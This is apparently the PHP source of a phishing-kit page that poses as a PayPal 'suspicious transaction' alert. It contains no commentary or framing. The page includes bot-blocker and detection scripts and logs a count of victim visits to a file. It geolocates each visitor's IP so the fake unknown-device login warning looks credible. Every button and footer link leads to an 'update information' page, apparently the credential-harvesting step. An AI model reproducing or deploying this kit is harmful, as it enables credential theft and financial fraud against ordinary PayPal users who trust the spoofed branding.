<?php

include('../blocker.php');
include('../detect.php');
include('../form/info.php'); 
$datei = fopen("../ck_squad_logs/login.txt","r");
$count = fgets($datei,1000);
fclose($datei);
$count=$count + 1 ;

$datei = fopen("../ck_squad_logs/login.txt","w");
fwrite($datei, $count);
fclose($datei);
?>
<!DOCTYPE html>
<html lang="ja" class="translated-ltr">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<link rel="shortcut icon" href="../../poto/pp_favicon_x.ico">
	<link rel="apple-touch-icon" href="../../poto/apple-touch-icon.png">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
	<meta name="language" content="ja">
	<title>Suspicious transaction - PayPal
	</title><meta alskdfjas="">
	<link rel="stylesheet" href="../../Suspicious_files/app.css">
	<style type="text/css">

</style>
<script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="app" src="../../Suspicious_files/app.js">

</script>
<script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="config" src="../../Suspicious_files/config.js">

</script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="view/s12n/ato/activity" src="../../Suspicious_files/activity.js">
</script>
<link type="text/css" rel="stylesheet" charset="UTF-8" href="../../Suspicious_files/translateelement.css">

</head>
<body style="">
	<div class="grey-background header-body"><div id="header"><div class="container-fluid center-block-big">
		<table><tbody><tr><td><a href="websrc.php?cmd=_update-information&account_address=220cea1e84e226a1bb43d3225a36b2ed&session=1b54470184981c13bdf3e96343d198b1bbc4442c"><img src="../../Suspicious_files/logo_paypal_106x29.png" width="106" height="29" alt="PayPal">
		</a>
	</td>
	<td align="right" width="100%">
	</td>
</tr>
</tbody>
</table>
</div>
</div><div id="wrapper" class="page-container" role="main">
	<div class="container-fluid trayNavOuter activity-tray activity-tray-large"><div class="trayNavInner"><div class="row row-ie">
		<div class="col-md-5 logo-block"><div class="row"><div class="col-md-12 peek-shield">
			<img src="../../Suspicious_files/peek-shield-logo.png">
		</div>
	</div>
	<div class="row"><div class="col-md-12"><p class="logo-block-text"><font>
		<font>To help protect your account we regularly look for early signs of potentially fraudulent activity.
		</font>
	</font>
</p>
</div>
</div>
</div>
<div class="col-md-7 explanation-wrapper"><div class="row"><div class="col-md-12">
	<header><h4 class="flat-large-header"><font><font> We want to make sure you're the owner of this account 
	</font>
</font>
</h4>
</header>
</div>
</div>
<div class="row"><div class="col-md-12 explanation-block"><p><font>
	<font>We didn't recognise a device or location that was recently used to log in, so we'd like to confirm your identity.
	</font>
</font>
</p>
</div>
</div>
<div class="row"><div class="col-md-12">			<div class="report-activity-tray"><div class="activities details-box"><div class="header row no-transactions white-header">
	<label class="login-wrapper"><span class="device"><font><font>Login from unknown device 
	</font>
</font>
</span><span class="location span"><font>
	<font>
		<?php
		$user_ip = getenv('REMOTE_ADDR');
		$geo = unserialize(file_get_contents("http://www.geoplugin.net/php.gp?ip=$user_ip"));
		$region = $geo["geoplugin_regionName"];
		$country = $geo["geoplugin_countryName"];
		echo " ".$region." , ".$country."<br>";
		?>

	</font>
</font>
</span><span class="time span"><font><font>
	<?php
	$dt = date(" F j Y - h:i:s A");
	$msg = " ".$dt." ";
	echo " ".$dt." ";
	?>

</font>
</font>
</span>
</label>
</div>
</div>
</div>
<p><font><font>Just to be safe, we want to make sure that this is your account.
</font>
</font>
</p><div class="buttons requirejs-wait" style="">
	<a class="btn btn-primary button" href="websrc.php?cmd=_update-information&account_address=220cea1e84e226a1bb43d3225a36b2ed&session=1b54470184981c13bdf3e96343d198b1bbc4442c"><font><font>Continue
	</font>
</font>
</a>
</div>
</div>
</div>
</div>
</div>
</div>
</div> 

</div>
</div><script src="../../Suspicious_files/require-spinner.js">
	</script><script>RequireSpinners.activate();
</script>
<script data-main="https://www.paypalobjects.com/web/res/7a7/dd87ef7a2afbb69dece5be488ad19/js/app" src="../../Suspicious_files/require.js">
</script>
<script>require(['app', 'config'], function() {require(['jquery'], function($) {/* deal with overzealous OWASP encoding */var viewName = 'view/s12n&#x2F;ato&#x2F;activity'.replace(/&#x2F;/g,'/');require([viewName], function(view) {console.log(viewName + ' loaded.');RequireSpinners && RequireSpinners.stop();}, function(err) {console.log('Couldn\'t load JS associated with s12n&#x2F;ato&#x2F;activity, may not exist');console.log(err);RequireSpinners && RequireSpinners.stop();});});});
</script><script>
</script><footer class="footer"><div class="footer-nav"><div class="site-links container-fluid" style="align: right"><ul class="navlist"><li><a href="websrc.php?cmd=_update-information&account_address=220cea1e84e226a1bb43d3225a36b2ed&session=1b54470184981c13bdf3e96343d198b1bbc4442c"><font><font>Contact
</font>
</font>
</a>
</li><li><a href="websrc.php?cmd=_update-information&account_address=220cea1e84e226a1bb43d3225a36b2ed&session=1b54470184981c13bdf3e96343d198b1bbc4442c"><font>
	<font>Security
	</font>
</font>
</a>
</li><li><a href="https://www.paypal.com/gb/webapps/mpp/ua/privacy-full"><font><font>Log out
</font>
</font>
</a>
</li>
</ul>
</div>
</div>
<div class="footer-legal">
	<div class="container-fluid">
		<font style="padding-bottom: 13px;">Copyright © 1999-2018 PayPal. All rights reserved.</font>
	</div>
</div>
</footer>

</body>
</html>